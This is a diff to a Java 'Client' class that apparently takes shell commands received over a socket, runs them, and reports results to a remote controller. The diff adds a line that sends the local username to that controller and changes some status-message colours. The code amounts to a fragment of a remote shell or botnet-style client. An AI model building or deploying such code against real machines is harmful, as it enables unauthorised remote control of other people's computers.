@@ -26,11 +26,14 @@ public class Client {
                 BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                 String cmd;
                 File workingDir = new File(System.getProperty("user.dir"));
-                
+                writer.println("Client name: " + System.getProperty("user.name"));
+                writer.flush();
                 while ((cmd = reader.readLine()) != null) {
+
                     if(!cmd.startsWith("CMD: ")) {
                         continue;
                     }
+                    writer.println("\u001B[33m" + "Start of broadcast @ port " + socket.getLocalPort() + "\u001B[0m" + "\n");
                     cmd = cmd.substring(4).trim();
 
                     if(cmd.toLowerCase().startsWith("cd")) {
@@ -43,7 +46,7 @@ public class Client {
                             writer.println("cannot find path.");
                         }
                         writer.flush();
-                        writer.println("\n" + "\u001B[31m" + "Broadcast completed @ Port " + socket.getLocalPort() + "." + "\u001B[0m");
+                        writer.println("\n" + "\u001B[33m" + "Broadcast completed @ Port " + socket.getLocalPort() + "." + "\u001B[0m");
                         continue;
                     }
 
@@ -65,7 +68,7 @@ public class Client {
                     } catch(IOException ignored) {}
                 
                 shell.waitFor();
-                writer.println("\n" + "\u001B[31m" + "Broadcast completed @ Port " + socket.getLocalPort() + "." + "\u001B[0m");
+                writer.println("\n" + "\u001B[33m" + "Broadcast completed @ Port " + socket.getLocalPort() + "." + "\u001B[0m");
                 writer.flush();
                 }
                     
